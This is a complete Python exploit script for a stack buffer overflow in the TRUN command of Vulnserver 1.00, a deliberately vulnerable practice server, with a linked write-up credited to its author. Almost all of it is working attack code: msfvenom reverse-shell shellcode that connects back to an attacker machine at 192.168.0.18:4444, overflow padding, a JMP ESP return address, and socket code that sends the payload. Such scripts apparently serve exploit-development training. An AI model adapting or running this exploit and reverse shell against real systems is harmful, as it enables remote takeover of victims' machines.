#!/usr/bin/env python3
"""
Vulnserver TRUN exploit.

Vulnerable Software: Vulnserver
Version: 1.00
Exploit Author: Andres Roldan
Tested On: Windows 10 20H2
Writeup: https://fluidattacks.com/blog/vulnserver-trun/
"""

import socket
import struct

HOST = "192.168.0.20"
PORT = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.18 LPORT=4444
# EXITFUNC=none -f python -v SHELL -b '\x00'
SHELL = b""
SHELL += b"\xbf\xce\xed\x94\x3e\xd9\xc8\xd9\x74\x24\xf4\x58"
SHELL += b"\x2b\xc9\xb1\x52\x31\x78\x12\x83\xc0\x04\x03\xb6"
SHELL += b"\xe3\x76\xcb\xba\x14\xf4\x34\x42\xe5\x99\xbd\xa7"
SHELL += b"\xd4\x99\xda\xac\x47\x2a\xa8\xe0\x6b\xc1\xfc\x10"
SHELL += b"\xff\xa7\x28\x17\x48\x0d\x0f\x16\x49\x3e\x73\x39"
SHELL += b"\xc9\x3d\xa0\x99\xf0\x8d\xb5\xd8\x35\xf3\x34\x88"
SHELL += b"\xee\x7f\xea\x3c\x9a\xca\x37\xb7\xd0\xdb\x3f\x24"
SHELL += b"\xa0\xda\x6e\xfb\xba\x84\xb0\xfa\x6f\xbd\xf8\xe4"
SHELL += b"\x6c\xf8\xb3\x9f\x47\x76\x42\x49\x96\x77\xe9\xb4"
SHELL += b"\x16\x8a\xf3\xf1\x91\x75\x86\x0b\xe2\x08\x91\xc8"
SHELL += b"\x98\xd6\x14\xca\x3b\x9c\x8f\x36\xbd\x71\x49\xbd"
SHELL += b"\xb1\x3e\x1d\x99\xd5\xc1\xf2\x92\xe2\x4a\xf5\x74"
SHELL += b"\x63\x08\xd2\x50\x2f\xca\x7b\xc1\x95\xbd\x84\x11"
SHELL += b"\x76\x61\x21\x5a\x9b\x76\x58\x01\xf4\xbb\x51\xb9"
SHELL += b"\x04\xd4\xe2\xca\x36\x7b\x59\x44\x7b\xf4\x47\x93"
SHELL += b"\x7c\x2f\x3f\x0b\x83\xd0\x40\x02\x40\x84\x10\x3c"
SHELL += b"\x61\xa5\xfa\xbc\x8e\x70\xac\xec\x20\x2b\x0d\x5c"
SHELL += b"\x81\x9b\xe5\xb6\x0e\xc3\x16\xb9\xc4\x6c\xbc\x40"
SHELL += b"\x8f\x52\xe9\x4a\x5d\x3b\xe8\x4a\x70\xe7\x65\xac"
SHELL += b"\x18\x07\x20\x67\xb5\xbe\x69\xf3\x24\x3e\xa4\x7e"
SHELL += b"\x66\xb4\x4b\x7f\x29\x3d\x21\x93\xde\xcd\x7c\xc9"
SHELL += b"\x49\xd1\xaa\x65\x15\x40\x31\x75\x50\x79\xee\x22"
SHELL += b"\x35\x4f\xe7\xa6\xab\xf6\x51\xd4\x31\x6e\x99\x5c"
SHELL += b"\xee\x53\x24\x5d\x63\xef\x02\x4d\xbd\xf0\x0e\x39"
SHELL += b"\x11\xa7\xd8\x97\xd7\x11\xab\x41\x8e\xce\x65\x05"
SHELL += b"\x57\x3d\xb6\x53\x58\x68\x40\xbb\xe9\xc5\x15\xc4"
SHELL += b"\xc6\x81\x91\xbd\x3a\x32\x5d\x14\xff\x18\x64\x74"
SHELL += b"\x5d\x35\xc1\xed\xe3\x58\xf2\xd8\x20\x65\x71\xe8"
SHELL += b"\xd8\x92\x69\x99\xdd\xdf\x2d\x72\xac\x70\xd8\x74"
SHELL += b"\x03\x70\xc9"

PAYLOAD = (
    b"TRUN /.:/"
    + b"A" * 2003
    +
    # 62501205   FFE4             JMP ESP
    struct.pack("<L", 0x62501205)
    + b"C" * 32
    + SHELL
    + b"C" * (5000 - 2003 - 4 - 32 - len(SHELL))
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
